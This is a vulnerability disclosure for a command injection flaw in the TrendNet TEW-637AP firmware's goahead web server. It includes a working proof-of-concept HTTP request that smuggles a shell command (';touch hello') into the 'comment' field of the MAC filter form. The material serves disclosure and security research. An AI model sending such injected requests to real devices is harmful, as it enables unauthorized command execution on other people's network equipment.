# Trendnet TEW-637AP(V1.3.0.106) Contains Command injection vulnerability 

## overview

- Manufacturer's website information：https://www.trendnet.com/
- Firmware download address: https://www.trendnet.com/support/support-detail.asp?prod=145_TEW-637AP

## product information

TEW-637AP(V1.3.0.106)

![image-20220828224337173](readme.assets/image-20220828224337173.png)

## description

### 1. Vulnerability Details

The TEW-637AP(V1.3.0.106) contains a command injection vulnerability in file `/bin/goahead`, function`sub_4321F0`

![image-20220828224527969](readme.assets/image-20220828224527969.png)

`doSystem` will call system, so there is a command injection vulnerability via `comment`

### 2. Recurring loopholes and POC

In order to reproduce the vulnerability, the following steps can be followed:

1. Boot the firmware by qemu-system or other ways (real machine)
2. Attack with the following POC attacks

```
POST /goform/wirelessAddMacFilter HTTP/1.1
Host: 192.168.0.50
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Origin: http://192.168.0.50
Connection: close
Referer: http://192.168.0.50/wireless/wireless_mac_filtering.asp
Upgrade-Insecure-Requests: 1

comment=;touch%20hello&mac_address=aaaaa
```

By sending this poc, we can create a new file named hello

![image-20220828224646964](readme.assets/image-20220828224646964.png)